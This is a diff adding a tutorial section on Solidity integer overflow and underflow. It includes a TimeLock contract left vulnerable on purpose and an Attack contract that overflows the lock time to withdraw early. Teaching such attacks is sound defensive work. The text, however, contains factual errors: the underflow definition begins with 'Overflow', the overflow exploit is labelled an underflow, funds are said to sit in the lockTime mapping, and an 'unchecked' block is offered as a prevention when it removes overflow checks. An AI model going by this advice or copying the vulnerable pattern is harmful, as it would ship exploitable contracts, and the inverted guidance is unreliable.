@@ -134,3 +134,96 @@ In the contract above, the state was updated before the transfer, there is also 
 
 ### CONCLUSION
 Re-entrancy attacks are made possible by the use of a logical but insecure code pattern when performing transfers within Ethereum smart contracts. Bad actors exploit the blockchain by implementing reentrancy attacks to transfer and drain funds from vulnerable smart contracts.
+
+## SOLIDITY ATTACK VECTORS: #2 - Arithmetic Overflow and Underflow
+
+### Overflow
+Overflow is a state a uint (unsigned integer) reaches its maximum value, the next element added will return the default value. **uint8**, can hold values within the range(0, 255), if the value of an arithmetic operation becomes greater than 255, the value is set to zero which is an incorrect calculation.
+
+### Underflow
+Overflow is a state a uint (unsigned integer) reaches its minimum value, the next element subtracted will return the maximum byte size. **uint8**, can hold values within the range(0, 255), if the value of an arithmetic operation becomes lesser than 0, the value is set to 255 which is an incorrect calculation.
+
+![Arithmetic Overflow and Underflow Illustration](/images/overflow-underflow.png "Arithmetic Overflow and Underflow Illustration")
+
+In the **TimeLock** contract below, you can deposit funds into the contract, but you can only withdraw the funds after a week has passed. The lock time can also be increased by _increaseLockTime_ function.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.6;
+
+contract TimeLock {
+    mapping(address => uint) public balances;
+    mapping(address => uint) public lockTime;
+
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+        lockTime[msg.sender] = block.timestamp + 1 weeks;
+    }
+
+    function increaseLockTime(uint _secondsToIncrease) public {
+        lockTime[msg.sender] += _secondsToIncrease;
+    }
+
+    function withdraw() public {
+        require(balances[msg.sender] > 0, "Insufficient funds");
+        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
+
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+
+        (bool sent, ) = msg.sender.call{value: amount}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+```
+
+The funds deposited is stored in the **locktime** array. To exploit this contract, the attacker have to bypass the check for the lockTime period of the user.
+``` 
+require(block.timestamp > lockTime[msg.sender], "Lock time not expired"); 
+```
+By doing this:
+
+```solidity
+contract Attack {
+    TimeLock timeLock;
+
+    constructor(TimeLock _timeLock) {
+        timeLock = TimeLock(_timeLock);
+    }
+
+    fallback() external payable {}
+
+    function attack() public payable {
+        timeLock.deposit{value: msg.value}();
+        /*
+        if t = current lock time then we need to find x such that
+        x + t = 2**256 = 0
+        so x = -t
+        2**256 = type(uint).max + 1
+        so x = type(uint).max + 1 - t
+        */
+        timeLock.increaseLockTime(
+            type(uint).max + 1 - timeLock.lockTime(address(this))
+        );
+        timeLock.withdraw();
+    }
+}
+```
+
+In the _attack_ function, the user deposit ether into the contract and calls the _increaseLockTime_ function to cause `Underflow`.
+```
+type(uint).max + 1 - timeLock.lockTime(address(this))
+```
+we are subtracting the current timestamp value in the lockTime array, which after execution results in the value zero. And now, you can now withdraw your funds without any restrictions.
+
+### Preventative Techniques
+* Use _SafeMath_ libraries for arithmetic operations to prevent arithmetic overflow and underflow
+
+* There is a new "unchecked" block you can wrap your variables around.
+```
+unchecked {
+    myUint8--;
+}
+```
+
+* Solidity ≥0.8 defaults to throwing an error for overflow / underflow. It is handled by default.
